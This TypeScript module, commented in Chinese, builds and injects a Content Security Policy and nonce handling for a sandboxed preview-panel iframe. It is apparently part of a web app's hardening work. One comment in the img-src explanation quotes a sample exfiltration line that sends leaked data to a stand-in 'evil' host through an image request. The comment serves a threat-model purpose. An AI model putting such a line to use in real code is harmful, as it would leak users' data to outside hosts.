/**
 * 预览面板 bundle 的 CSP 处理（威胁模型见 PreviewPanelHost.tsx 文件头）。
 *
 * 两层策略同时作用于面板 iframe：
 * - 宿主自身注入的 meta 策略（buildPanelCsp）：收紧出站网络；
 * - 宿主文档的 HTTP 头策略：srcdoc iframe **继承**嵌入文档的策略。#989 起
 *   宿主 `script-src` 不再含 'unsafe-inline'，改为每次 index.html 响应
 *   一个 nonce（server/app/http_csp.py）。面板的 inline <script> 必须带
 *   同一 nonce 才能执行——injectPanelCsp 给 bundle 内每个 <script> 盖上它。
 *   nonce 盖章只授权 <script> 元素；inline 事件属性（`onclick=`）与
 *   `javascript:` URL 无从授权，仍被拦截（作者约束见
 *   server/app/mcp_server/preview_guide.md）。
 *
 * nonce 交给面板是可接受的：面板本就获准执行脚本、只能在自己的 opaque
 * origin 文档里用它；它写不进宿主 DOM，而 nonce 每次页面加载都换新。
 */
import { PREVIEW_PANEL_SOURCE } from './bridge'
import { stampScriptNonces } from './panelCspBundleNonce'

/**
 * vite `html.cspNonce` 写入构建产物的占位符（与 frontend/vite.config.ts、
 * server/app/http_csp_nonce.py 的 CSP_NONCE_PLACEHOLDER 同值）。vite dev /
 * preview 不替换它、也不下发 CSP——读到占位符即视为无 nonce。
 */
export const CSP_NONCE_PLACEHOLDER = '__AGENT_LEGION_CSP_NONCE__'

/**
 * 读宿主文档本次响应的 script nonce（无则空串）。浏览器对带 CSP 头的文档
 * 隐藏 nonce 属性值（getAttribute 返回空串），只能读 `.nonce` IDL 属性；
 * getAttribute 兜底覆盖不实现 IDL 属性的环境（jsdom）。
 */
export function readDocumentCspNonce(doc: Document = document): string {
  const meta = doc.querySelector<HTMLMetaElement>('meta[property="csp-nonce"]')
  const nonce = meta?.nonce || meta?.getAttribute('nonce') || ''
  return nonce === CSP_NONCE_PLACEHOLDER ? '' : nonce
}

/**
 * 出站网络红线（见 PreviewPanelHost 文件头）。origin 用注入时的绝对值：
 * opaque origin 下 'self' 不匹配任何 URL（CSP3），写了等于没写——connect/
 * script/style/font 统一拼平台 origin。img-src 同样收敛到 `data:` + 平台
 * origin（#500 P1-4）：预览 bundle 的实际图源只有 data: 内联（单文件 bundle
 * 契约），放行任意 `https:` 会给 `new Image().src='https://evil/?d='+leak`
 * 留零门槛 GET 外带通道——与 fetch/sendBeacon 同罪，一并闭合。
 *
 * media-src 放行 `blob:`（#1146）：面板经桥 readArtifactBytes 拿到媒体字节
 * 后用 URL.createObjectURL 在本帧建 blob URL 喂 <video>/<audio>。blob URL
 * 只能由面板自身脚本在本帧创建（opaque origin 的 blob 命名空间归本帧），
 * 媒体字节全部来自桥——不是网络子资源，不构成出站面；不写平台 origin 与
 * data:（无实际引用面）。宿主文档头策略的 media-src 本就含 blob:，本条
 * 只是把被 default-src 'none' 压死的媒体元素放开。
 *
 * 本策略的 script-src 保持 'unsafe-inline'（不写 nonce）：nonce 管控由继承
 * 的宿主头策略负责；这里若也写 nonce，实例设置的 CSP 兼容模式
 * （csp_script_unsafe_inline）就无法让 inline 事件属性复活。
 */
export function buildPanelCsp(): string {
  // 测试（node 环境）与浏览器都取当前 origin；取不到时退化为不含 origin
  // 白名单的最小策略（脚本/样式 inline 仍可用，平台资产加载会失败——
  // bundle 契约本就要求资产缺失时自行降级）。
  const origin = typeof window === 'undefined' ? '' : window.location.origin
  const withOrigin = origin ? ` ${origin}` : ''
  return [
    "default-src 'none'",
    // 单文件 bundle 的脚本/样式本体就是 inline 的；katex 等平台构建资产按
    // init.assets 的绝对 URL 加载。
    `script-src 'unsafe-inline'${withOrigin}`,
    `style-src 'unsafe-inline'${withOrigin}`,
    `font-src${withOrigin}`,
    // data: 内联图（单文件 bundle 的常见模式）；远程图不再放行——远程
    // 图源是任意外带 URL 的载体，产品取舍见函数头注释。
    `img-src data:${withOrigin}`,
    // #1146：面板自建 blob 的 <video>/<audio>（readArtifactBytes）。
    `media-src blob:`,
    // 面板经桥取数，不需要任何 XHR/fetch；connect-src 收紧到平台 origin，
    // 堵死 fetch/sendBeacon 外传通道。
    `connect-src${withOrigin}`,
    "form-action 'none'",
  ].join('; ')
}

/**
 * 面板内的脚本拦截探针（#989）：严格策略下 inline 事件属性静默失效，
 * 面板看上去正常、按钮却不响应。探针监听 securitypolicyviolation，把
 * script-src 系拦截按指令去重后报给宿主（csp-violation），宿主据此提示
 * 改写或回退。探针本身是带 nonce 的 inline 脚本，落在 head 最前（CSP meta
 * 之后），先于 bundle 任何内容注册。
 */
const VIOLATION_PROBE = `(function(){var seen={};document.addEventListener('securitypolicyviolation',function(e){var d=e.effectiveDirective||e.violatedDirective||'';if(d.indexOf('script-src')!==0||seen[d])return;seen[d]=1;window.parent.postMessage({source:${JSON.stringify(PREVIEW_PANEL_SOURCE)},type:'csp-violation',directive:d},'*')})})()`

/**
 * 把 CSP meta（与 nonce 探针）注入 bundle 文档的真实 <head> 顶部，并给
 * 每个 <script> 盖上宿主 nonce（nonce 为空时不盖章、不注入探针）。
 *
 * 落点必须用 DOMParser 按解析器语义定位：正则找 `<head` 会被攻击者文本
 * 抢占——注释（`<!-- <head> -->`）、JS 字符串字面量、属性值里的伪 `<head>`
 * 都能让 meta 落不进真正的 head 元素，整个策略失效（评审 P0）。DOMParser
 * 是 inert 的（不执行脚本、不加载资源），解析-插入-序列化对 bundle 内容
 * 透明。bundle 自带的 CSP meta 若存在只会更严（多策略取交集）。
 * 序列化用 outerHTML 而非 XMLSerializer：保持 HTML 语法（自闭合、实体）。
 * 盖章同样走解析器语义：只有真实 <script> 元素拿到 nonce，字符串或注释里
 * 的伪 `<script>` 不受影响；bundle 自带 nonce 策略的脚本保留原 nonce（规则
 * 见 panelCspBundleNonce.ts）。
 */
export function injectPanelCsp(html: string, csp: string, nonce = ''): string {
  const meta = document.createElement('meta')
  meta.setAttribute('http-equiv', 'Content-Security-Policy')
  meta.setAttribute('content', csp)
  const doc = new DOMParser().parseFromString(html, 'text/html')
  if (nonce) {
    stampScriptNonces(doc, nonce)
    const probe = doc.createElement('script')
    probe.setAttribute('nonce', nonce)
    probe.textContent = VIOLATION_PROBE
    doc.head.insertBefore(probe, doc.head.firstChild)
  }
  // 无 <head> 时 DOMParser 会隐式建一个（如纯片段输入），插入仍然成立。
  doc.head.insertBefore(meta, doc.head.firstChild)
  return `<!doctype html>${doc.documentElement.outerHTML}`
}
